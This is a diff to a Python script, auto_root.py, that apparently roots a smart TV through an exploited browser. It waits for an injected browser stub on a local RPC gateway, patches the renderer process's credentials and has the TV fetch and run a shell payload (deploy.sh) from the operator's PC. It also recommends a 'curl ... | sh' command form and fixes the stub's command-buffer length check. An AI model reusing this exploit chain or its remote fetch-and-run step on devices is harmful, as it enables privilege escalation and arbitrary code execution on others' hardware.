@@ -4,8 +4,13 @@ Start this *before* opening the page on the TV: it blocks on the local RPC
 gateway (127.0.0.1:9998) until the browser stub connects, then patches the
 renderer's cred and fires the deploy script in the same stub lifetime.
 
+The default script is `deploy.sh`, which server.py RENDERS per request (H= is
+the address the TV fetched it from, WANT=/SIZE_WANT= the served payload hash).
+A plain static server is handled by deploy.sh's own NEED_RENDER guard, so the
+old "serve the un-rewritten deploy.sh and get CURL_FAIL" trap is gone.
+
 Usage:
-    python auto_root.py --host <PC-IP> [--script deploy_local.sh] [--wait 150]
+    python auto_root.py --host <PC-IP> [--script deploy.sh] [--wait 150]
                         [--stub-wait 0]
 
 --stub-wait 0 (default) waits forever for a stub; a positive value gives up
@@ -43,9 +48,11 @@ def start_heartbeat(url, interval):
     return stop
 
 
-def run(rpc, cmd, wait=120.0):
+def run(rpc, cmd, wait=180.0):
     buf = b"-c\x00" + cmd.encode()
-    if len(buf) > 512:
+    # The stub's cmdbuf is 512 B and v39 NUL-terminates after the body, so the
+    # body (including "-c\0") must leave room for that NUL: 511, not 512.
+    if len(buf) > 511:
         raise SystemExit(f"[-] command is {len(buf)} B; the stub's cmdbuf is 512 B "
                          f"(use a short 'curl ... | sh' form)")
     rpc._cmd(7, 0, 0, len(buf))
